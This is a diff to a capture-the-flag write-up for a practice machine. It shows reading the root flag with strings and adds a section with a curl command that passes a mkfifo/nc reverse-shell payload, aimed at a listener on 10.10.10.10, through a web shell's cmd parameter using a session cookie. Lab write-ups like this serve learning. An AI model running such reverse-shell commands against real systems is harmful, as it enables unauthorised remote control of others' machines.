@@ -183,10 +183,20 @@ uid=1000(jack) gid=1000(jack) groups=1000(jack),24(cdrom),25(floppy),29(audio),3
 jack@jack-of-all-trades:~$ LFILE=/root/root.txt
 jack@jack-of-all-trades:~$ strings "$LFILE"
 ```
- Thank you for your reading. Happy hacking and Enjoy! 😄
+
+Thank you for your reading. Happy hacking and Enjoy! 😄
  
- 
- 
- 
+
+## Omake
+By using curl --data-urlencode I could send whiout url encoding of parameter's value.
+
+I am confused with encodings always. 😫
+
+```
+curl -G -k http://ip.thm:22/nnxhweOV/index.php --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+2>&1|nc 10.10.10.10 4444 >/tmp/f' -b 'PHPSESSID=pv3m5iab2krog9qatsm1c0oi62; login=jackinthebox%3Aa78e6e9d6f7b9d0abe0ea866792b
+7d84'
+```
+
  
  
